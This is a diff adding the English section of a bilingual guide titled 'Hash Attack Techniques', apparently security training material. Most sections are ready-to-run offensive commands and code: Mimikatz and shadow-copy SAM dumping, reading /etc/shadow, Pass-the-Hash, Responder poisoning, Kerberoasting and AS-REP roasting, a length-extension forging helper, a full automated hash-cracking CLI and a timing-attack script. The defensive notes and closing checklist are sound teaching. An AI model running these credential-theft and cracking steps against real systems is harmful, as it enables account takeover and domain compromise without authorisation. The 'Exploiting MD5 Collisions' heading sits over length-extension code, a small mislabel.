@@ -688,3 +688,697 @@ MAC/서명:
   □ SHA-256 서명 알고리즘
   □ SHA-1 서명 인증서 거부
 ```
+
+---
+
+<a name="english"></a>
+
+# Hash Attack Techniques — Complete Guide
+
+## Hash Function Security Properties
+
+```
+Three properties of cryptographic hash functions:
+
+1. Preimage Resistance
+   Given H(m) = h, it is hard to find m
+   → Protects password hashes
+
+2. Second Preimage Resistance
+   Given m, it is hard to find another m' such that H(m') = H(m)
+   → Prevents document forgery
+
+3. Collision Resistance
+   It is hard to find m1 ≠ m2 such that H(m1) = H(m2)
+   → Protects digital signatures
+
+Current status of broken algorithms:
+  MD5: Collision resistance broken (1996), practical attacks possible (2004)
+  SHA-1: Collision resistance broken (2017, SHAttered)
+  SHA-256/SHA-3: Currently secure
+```
+
+---
+
+## 1. MD5 Collision Attacks
+
+### MD5 Collision Lab
+
+Generate a pair of MD5 collision files using the fastcoll tool. Demonstrates a collision attack by creating two different files with identical MD5 hashes.
+
+```bash
+# MD5 collision demo files (fastcoll)
+fastcoll -o collision1.bin collision2.bin
+
+md5sum collision1.bin collision2.bin
+# → Identical MD5 hash!
+
+sha256sum collision1.bin collision2.bin
+# → Different SHA-256 hashes
+
+# Practical use: AV evasion (signature-based)
+# Possible to create a malicious file with the same MD5 as a legitimate file
+# → Never use MD5 for file integrity verification!
+```
+
+### Exploiting MD5 Collisions
+
+Implements a Length Extension Attack. Uses the internal state of MD5/SHA-1/SHA-256 to forge signed messages without HMAC.
+
+```python
+# Length Extension Attack
+# Vulnerability in SHA-1, SHA-256, MD5
+# Applies to MACs using H(secret || message) instead of HMAC
+
+import hashlib
+import struct
+
+def md5_pad(message: bytes) -> bytes:
+    """Add MD5 padding"""
+    length = len(message) * 8
+    message += b'\x80'
+    while len(message) % 64 != 56:
+        message += b'\x00'
+    message += struct.pack('<Q', length)
+    return message
+
+def md5_length_extension(
+    original_hash: str,       # Known H(secret || msg)
+    original_msg: bytes,      # Known msg
+    secret_len: int,          # Estimated secret length
+    additional_data: bytes    # Data to append
+) -> tuple:
+    """
+    Length extension attack:
+    H(secret || msg) → H(secret || msg || padding || additional)
+    Possible without the secret!
+    """
+    import hashpumpy
+    
+    # Using the hashpumpy library
+    new_hash, new_message = hashpumpy.hashpump(
+        original_hash,
+        original_msg,
+        additional_data,
+        secret_len
+    )
+    
+    return new_hash, new_message
+
+# Example: When a web app uses H(secret || username=admin) as a cookie
+# Use length extension to generate H(secret || username=admin || padding || &admin=true)
+```
+
+---
+
+## 2. Password Hash Attacks
+
+### Rainbow Tables
+
+Rainbow tables are precomputed hash-to-password mapping tables used to reverse hash values back to original passwords. Applying a salt neutralizes rainbow table attacks.
+
+```bash
+# Ophcrack (Windows LM/NTLM)
+ophcrack -g -d /usr/share/ophcrack/tables/ \
+          -t XP_free_fast -f hash.txt
+
+# RainbowCrack
+rtgen md5 loweralpha-numeric 1 9 0 3800 33554432 0
+rtsort *.rt
+rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
+
+# rcracki_mt (multi-threaded)
+rcracki_mt -f hash.txt *.rt
+
+# Online rainbow tables
+# crackstation.net
+# md5decrypt.net
+# hashes.com
+```
+
+### Limits of bcrypt/Argon2 Cracking
+
+Demonstrates the limits of cracking bcrypt and Argon2. Intentionally slow hash functions significantly limit GPU parallelism, making brute force impractical.
+
+```bash
+# bcrypt (slow hash)
+# $2y$12$... → cost factor 12
+# ~100 attempts per second (GPU)
+# RTX 3090: ~184 H/s (very slow)
+
+# By comparison, MD5 on RTX 3090: 60,000 MH/s
+# 327,000,000x slower than bcrypt!
+
+hashcat -m 3200 bcrypt.txt wordlist.txt
+# Use -w 4 option for maximum performance
+
+# Argon2 cracking (even slower)
+hashcat -m 13900 argon2.txt wordlist.txt
+
+# Practical defense:
+# bcrypt cost 12+ → fewer than 100 attempts per second
+# Attacker cloud cost: 1 billion attempts = $14,000+
+```
+
+### /etc/shadow File Attacks
+
+Analyzes the hash format of Linux /etc/shadow files. $6$ is SHA-512Crypt, $1$ is MD5Crypt — can be cracked offline with john or hashcat.
+
+```bash
+# Linux password hash formats
+# $1$ = MD5Crypt
+# $2a$/2y$/2b$ = bcrypt
+# $5$ = SHA-256Crypt
+# $6$ = SHA-512Crypt (recommended)
+# $y$ = yescrypt
+
+# Example shadow entry
+# user:$6$rounds=5000$randomsalt$HASH:18000:0:99999:7:::
+
+# john cracking
+john --wordlist=wordlist.txt /etc/shadow
+john --format=sha512crypt hash.txt --wordlist=rockyou.txt
+
+# hashcat
+# SHA-512Crypt mode (1800)
+hashcat -m 1800 shadow_hashes.txt wordlist.txt
+
+# Unshadow (combine passwd + shadow)
+unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt
+```
+
+---
+
+## 3. Windows Password Hashes
+
+### NTLM Hash Extraction and Cracking
+
+Extracts NTLM hashes from the Windows SAM database and cracks them with hashcat. Can also be used for Pass-the-Hash attacks.
+
+```bash
+# Extract hashes from SAM database
+# Method 1: Mimikatz (from memory)
+mimikatz# sekurlsa::logonpasswords
+mimikatz# lsadump::sam
+
+# Method 2: Volume Shadow Copy
+vssadmin create shadow /for=c:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
+
+# secretsdump.py (remote)
+python3 secretsdump.py DOMAIN/USER:PASS@TARGET_IP
+
+# NTLM hash cracking
+hashcat -m 1000 ntlm_hashes.txt wordlist.txt
+john --format=nt ntlm_hashes.txt --wordlist=rockyou.txt
+
+# Pass-the-Hash (authenticate with hash, no password needed)
+python3 smbclient.py -hashes ':NTLM_HASH' DOMAIN/USER@TARGET
+```
+
+### NTLMv2 Capture and Cracking
+
+Captures NTLMv2 challenge-responses from the network using Responder. A man-in-the-middle attack that intercepts credentials via LLMNR/NBT-NS poisoning.
+
+```bash
+# Capture NTLMv2 with Responder
+sudo python3 Responder.py -I eth0 -wrf
+
+# Crack captured hashes
+hashcat -m 5600 netntlmv2.txt rockyou.txt
+
+# JohntheRipper
+john netntlmv2.txt --wordlist=rockyou.txt --format=netntlmv2
+
+# Example of cracked NTLMv2
+# Administrator::DOMAIN:CHALLENGE:RESPONSE:...
+```
+
+---
+
+## 4. Kerberos Hash Attacks
+
+### Kerberoasting
+
+Requests Kerberos TGS tickets to extract service account hashes. Cracks the passwords of service accounts with SPNs configured, offline.
+
+```bash
+# Request service tickets (service accounts with SPN)
+# Impacket
+python3 GetUserSPNs.py DOMAIN/USER:PASS@DC_IP -request
+
+# PowerShell (Rubeus)
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Crack captured TGS hashes
+# $krb5tgs$23$... (RC4-HMAC) → mode 13100
+hashcat -m 13100 kerberoast_hashes.txt wordlist.txt
+
+# $krb5tgs$18$... (AES256) → mode 19700
+hashcat -m 19700 kerberoast_aes.txt wordlist.txt
+```
+
+### AS-REP Roasting
+
+Extracts hashes from AS-REP responses for accounts with Kerberos pre-authentication disabled. Targets vulnerable accounts after domain user enumeration.
+
+```bash
+# Target accounts with Kerberos pre-authentication disabled
+python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
+    -format hashcat -outputfile asrep_hashes.txt \
+    -dc-ip DC_IP
+
+# Cracking
+# $krb5asrep$23$... → mode 18200
+hashcat -m 18200 asrep_hashes.txt wordlist.txt
+```
+
+---
+
+## 5. Hash Attack Automation
+
+A Python script that automates various hash attack techniques. Processes the pipeline from hash type identification through cracking tool invocation.
+
+```python
+#!/usr/bin/env python3
+"""
+Automated hash cracking pipeline CLI
+Usage: python3 hash_cracker.py crack --hash 5f4dcc3b5aa765d61d8327deb882cf99
+       python3 hash_cracker.py crack --file hashes.txt --wordlist rockyou.txt
+       python3 hash_cracker.py identify --hash '$6$rounds=5000$salt$HASH'
+"""
+
+from __future__ import annotations
+import argparse
+import hashlib
+import json
+import re
+import subprocess
+import sys
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+# ── Hash pattern definitions ───────────────────────────────────────────
+
+HASH_SIGNATURES: list[tuple[str, str, int]] = [
+    # (pattern, name, hashcat_mode)
+    (r"^\$krb5tgs\$23\$.+",    "Kerberoast-RC4",   13100),
+    (r"^\$krb5tgs\$18\$.+",    "Kerberoast-AES",   19700),
+    (r"^\$krb5asrep\$23\$.+",  "AS-REP-RC4",       18200),
+    (r"^\$krb5asrep\$18\$.+",  "AS-REP-AES",       19800),
+    (r"^\$2[ayb]\$.{56}$",     "bcrypt",            3200),
+    (r"^\$6\$.+",              "sha512crypt",        1800),
+    (r"^\$5\$.+",              "sha256crypt",        7400),
+    (r"^\$1\$.+",              "md5crypt",            500),
+    (r"^\$y\$.+",              "yescrypt",           None),
+    (r"^[a-f0-9]{128}$",       "SHA-512",            1700),
+    (r"^[a-f0-9]{64}$",        "SHA-256",            1400),
+    (r"^[a-f0-9]{56}$",        "SHA-224",            1300),
+    (r"^[a-f0-9]{40}$",        "SHA-1",               100),
+    (r"^[a-f0-9]{32}$",        "MD5/NTLM",            0),  # 0 → dict, also try 1000
+]
+
+NTLM_EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"
+
+
+def identify_hash(h: str) -> list[tuple[str, int | None]]:
+    """Hash string → [(type_name, hashcat_mode), ...]"""
+    results: list[tuple[str, int | None]] = []
+    for pattern, name, mode in HASH_SIGNATURES:
+        if re.match(pattern, h, re.IGNORECASE):
+            results.append((name, mode))
+            # For 32-char hex, also add NTLM mode
+            if name == "MD5/NTLM":
+                results.append(("NTLM", 1000))
+    return results or [("Unknown", None)]
+
+
+# ── Local dictionary cracker ────────────────────────────────────
+
+_DIGEST_FUNCS: dict[str, object] = {
+    "md5":    hashlib.md5,
+    "sha1":   hashlib.sha1,
+    "sha256": hashlib.sha256,
+    "sha512": hashlib.sha512,
+}
+
+
+def crack_local(hash_str: str, wordlist: Path,
+                algo: str = "md5") -> str | None:
+    """Pure Python dictionary cracking (MD5/SHA family)"""
+    fn = _DIGEST_FUNCS.get(algo)
+    if fn is None:
+        return None
+    h_lower = hash_str.lower()
+    try:
+        with wordlist.open("r", encoding="latin-1", errors="replace") as fp:
+            for line in fp:
+                word = line.rstrip("\n")
+                if fn(word.encode()).hexdigest() == h_lower:
+                    return word
+    except OSError as e:
+        print(f"[-] Wordlist error: {e}", file=sys.stderr)
+    return None
+
+
+# ── Hashcat wrapper ─────────────────────────────────────────────
+
+def crack_hashcat(
+    hash_str: str,
+    mode: int,
+    wordlist: Path,
+    rules: list[Path] | None = None,
+    brute_mask: str | None = None,
+    timeout: int = 300,
+) -> str | None:
+    """Run hashcat and return cracking result"""
+    tmp = Path("/tmp/_hc_target.txt")
+    tmp.write_text(hash_str + "\n")
+
+    cmd = ["hashcat", "-m", str(mode), str(tmp), "--quiet",
+           "--potfile-disable", "--status-timer=10"]
+
+    if brute_mask:
+        cmd += ["-a", "3", brute_mask]
+    else:
+        cmd += [str(wordlist)]
+        for r in (rules or []):
+            cmd += ["-r", str(r)]
+
+    try:
+        result = subprocess.run(
+            cmd, capture_output=True, text=True, timeout=timeout
+        )
+        # Extract result with hashcat --show
+        show = subprocess.run(
+            ["hashcat", "-m", str(mode), str(tmp), "--show", "--potfile-disable"],
+            capture_output=True, text=True, timeout=10,
+        )
+        for line in show.stdout.splitlines():
+            if ":" in line:
+                return line.split(":", 1)[-1].strip()
+    except FileNotFoundError:
+        print("[-] hashcat not installed", file=sys.stderr)
+    except subprocess.TimeoutExpired:
+        print(f"[-] hashcat timeout ({timeout}s)", file=sys.stderr)
+    return None
+
+
+# ── Main cracking pipeline ───────────────────────────────────
+
+@dataclass
+class CrackResult:
+    hash_str: str
+    hash_type: str = "Unknown"
+    password: str | None = None
+    method: str = ""
+    errors: list[str] = field(default_factory=list)
+
+
+def crack_pipeline(
+    hash_str: str,
+    wordlist: Path,
+    rules: list[Path] | None = None,
+    use_hashcat: bool = True,
+    timeout: int = 300,
+) -> CrackResult:
+    res = CrackResult(hash_str=hash_str)
+    types = identify_hash(hash_str)
+    res.hash_type = " / ".join(t for t, _ in types)
+    print(f"[*] {hash_str[:32]}...  Type: {res.hash_type}")
+
+    # 1. Python local cracking (MD5/SHA1)
+    for name, _ in types:
+        algo = {"MD5/NTLM": "md5", "SHA-1": "sha1",
+                "SHA-256": "sha256", "SHA-512": "sha512"}.get(name)
+        if algo:
+            print(f"    [Python] {algo} dictionary cracking...")
+            pw = crack_local(hash_str, wordlist, algo)
+            if pw:
+                res.password, res.method = pw, f"python_{algo}"
+                return res
+
+    # 2. hashcat
+    if use_hashcat:
+        for name, mode in types:
+            if mode is None:
+                continue
+            print(f"    [hashcat -m {mode}] dictionary...")
+            pw = crack_hashcat(hash_str, mode, wordlist, rules, timeout=timeout)
+            if pw:
+                res.password, res.method = pw, f"hashcat_dict_{name}"
+                return res
+
+            if mode in (0, 100, 1000, 1400):   # Brute force only for fast hashes
+                print(f"    [hashcat -m {mode}] brute (6 chars)...")
+                pw = crack_hashcat(hash_str, mode, wordlist,
+                                   brute_mask="?l?l?l?l?l?l", timeout=60)
+                if pw:
+                    res.password, res.method = pw, f"hashcat_brute_{name}"
+                    return res
+
+    print("    [-] Cracking failed")
+    return res
+
+
+# ── CLI ──────────────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Hash cracking pipeline")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    # identify
+    id_p = sub.add_parser("identify", help="Identify hash type")
+    id_p.add_argument("--hash", required=True)
+
+    # crack
+    cr_p = sub.add_parser("crack", help="Crack hash")
+    cr_p.add_argument("--hash", help="Single hash")
+    cr_p.add_argument("--file", type=Path, help="Hash list file (one per line)")
+    cr_p.add_argument("--wordlist", type=Path,
+                      default=Path("/usr/share/wordlists/rockyou.txt"))
+    cr_p.add_argument("--rules", nargs="*", type=Path)
+    cr_p.add_argument("--no-hashcat", action="store_true")
+    cr_p.add_argument("--timeout", type=int, default=300)
+    cr_p.add_argument("--output", type=Path, help="Save results as JSON")
+
+    args = parser.parse_args()
+
+    if args.cmd == "identify":
+        types = identify_hash(args.hash)
+        print(f"Hash: {args.hash}")
+        for name, mode in types:
+            hc = f"hashcat -m {mode}" if mode is not None else "N/A"
+            print(f"  {name:20s}  {hc}")
+        return
+
+    hashes: list[str] = []
+    if args.hash:
+        hashes.append(args.hash)
+    if args.file:
+        try:
+            hashes.extend(
+                l.strip() for l in args.file.read_text().splitlines() if l.strip()
+            )
+        except OSError as e:
+            print(f"[-] File error: {e}", file=sys.stderr)
+            sys.exit(1)
+
+    if not hashes:
+        print("[-] Specify --hash or --file.", file=sys.stderr)
+        sys.exit(1)
+
+    results: list[dict] = []
+    for h in hashes:
+        res = crack_pipeline(
+            h, args.wordlist, args.rules or [],
+            not args.no_hashcat, args.timeout,
+        )
+        if res.password:
+            print(f"[+] {res.hash_str[:32]}... → {res.password}  ({res.method})")
+        results.append({"hash": res.hash_str, "type": res.hash_type,
+                        "password": res.password, "method": res.method})
+
+    if args.output:
+        args.output.write_text(json.dumps(results, indent=2, ensure_ascii=False))
+        print(f"[*] Results saved: {args.output}")
+
+    cracked = sum(1 for r in results if r["password"])
+    print(f"\n[Summary] {cracked}/{len(results)} cracked successfully")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. HMAC and MAC Attacks
+
+### Timing Attacks
+
+A timing attack infers secret information by measuring minute differences in computation time. Use constant-time comparison functions instead of regular string comparison.
+
+```python
+#!/usr/bin/env python3
+"""
+Timing attack demo & safe HMAC comparison
+Usage: python3 timing_attack.py demo
+       python3 timing_attack.py safe-compare --a "abc" --b "abc"
+"""
+
+from __future__ import annotations
+import argparse
+import hmac
+import statistics
+import sys
+import time
+
+
+# ── Vulnerable comparison (timing attack target) ──────────────────────────
+
+def vulnerable_compare(a: str, b: str) -> bool:
+    """
+    Vulnerable: returns immediately at first mismatch
+    → Execution time varies with the number of matching bytes
+    """
+    if len(a) != len(b):
+        return False
+    for x, y in zip(a, b):
+        if x != y:
+            return False      # Early return → time leak
+    return True
+
+
+# ── Constant-time comparison (safe) ─────────────────────────────────
+
+def safe_compare(a: str, b: str) -> bool:
+    """hmac.compare_digest — always compares fully, no time leak"""
+    return hmac.compare_digest(a.encode(), b.encode())
+
+
+# ── Timing attack simulation ───────────────────────────────────
+
+def timing_attack(
+    target: str,
+    charset: str = "0123456789abcdef",
+    samples: int = 200,
+    verbose: bool = True,
+) -> str:
+    """
+    Byte-by-byte timing attack using vulnerable_compare
+    The character that takes longest at each position = matching character
+
+    Note: Real network attacks have much more measurement noise,
+          requiring thousands to tens of thousands of samples.
+    """
+    recovered = ""
+
+    for pos in range(len(target)):
+        char_times: dict[str, float] = {}
+
+        for ch in charset:
+            guess = recovered + ch + "0" * (len(target) - len(recovered) - 1)
+            measurements: list[int] = []
+
+            for _ in range(samples):
+                t0 = time.perf_counter_ns()
+                vulnerable_compare(guess, target)
+                t1 = time.perf_counter_ns()
+                measurements.append(t1 - t0)
+
+            # Use median (to remove outliers)
+            char_times[ch] = statistics.median(measurements)
+
+        best = max(char_times, key=char_times.get)
+        recovered += best
+
+        if verbose:
+            top3 = sorted(char_times.items(), key=lambda kv: kv[1], reverse=True)[:3]
+            print(f"  Position {pos:02d}: '{best}'  Recovered: {recovered!r:20s}  "
+                  f"Top3={[(c, f'{t:.0f}ns') for c, t in top3]}")
+
+    return recovered
+
+
+def run_demo() -> None:
+    """Vulnerable vs safe comparison demo"""
+    secret_mac = "deadbeef1234"
+    print(f"=== Timing Attack Demo ===")
+    print(f"Actual MAC: {secret_mac}\n")
+
+    print("[*] Starting timing attack (vulnerable_compare)...")
+    recovered = timing_attack(secret_mac, samples=300)
+    success = recovered == secret_mac
+    print(f"\n[{'+'if success else '-'}] Recovery result: {recovered!r}  "
+          f"({'Success' if success else 'Failure'})\n")
+
+    print("[*] Verifying safe_compare accuracy")
+    print(f"  Correct MAC comparison: {safe_compare(secret_mac, secret_mac)}")
+    print(f"  Wrong MAC comparison  : {safe_compare(secret_mac, 'deadbeef0000')}")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Timing attack demo")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    sub.add_parser("demo", help="Run vulnerable vs safe comparison demo")
+
+    atk = sub.add_parser("attack", help="Run timing attack")
+    atk.add_argument("--target",  required=True, help="Target string")
+    atk.add_argument("--charset", default="0123456789abcdef")
+    atk.add_argument("--samples", type=int, default=200)
+
+    cmp = sub.add_parser("safe-compare", help="Constant-time comparison")
+    cmp.add_argument("--a", required=True)
+    cmp.add_argument("--b", required=True)
+
+    args = parser.parse_args()
+
+    if args.cmd == "demo":
+        run_demo()
+    elif args.cmd == "attack":
+        print(f"[*] Timing attack: target={args.target!r}")
+        result = timing_attack(args.target, args.charset, args.samples)
+        print(f"\n[Result] {result!r}")
+    elif args.cmd == "safe-compare":
+        match = safe_compare(args.a, args.b)
+        print(f"Comparison result: {'Match' if match else 'Mismatch'}")
+        sys.exit(0 if match else 1)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        run_demo()
+    else:
+        main()
+```
+
+---
+
+## 7. Hash Security Checklist
+
+```
+Password storage:
+  □ Use bcrypt, Argon2id, or scrypt (slow hashes)
+  □ Never use MD5, SHA-1, or SHA-256 alone
+  □ Periodically increase cost factor (as hardware improves)
+  □ Auto-generate salts (let the library handle it)
+
+MAC/Signatures:
+  □ Use HMAC (never simple H(key || msg))
+  □ Use hmac.compare_digest() for constant-time comparison
+  □ Use HMAC-SHA256 or stronger
+
+File integrity:
+  □ Use SHA-256 or stronger
+  □ Never use MD5/SHA-1 alone
+  □ Consider including key-based authentication with HMAC
+
+Certificates/Signatures:
+  □ Use SHA-256 signing algorithm
+  □ Reject certificates signed with SHA-1
+```
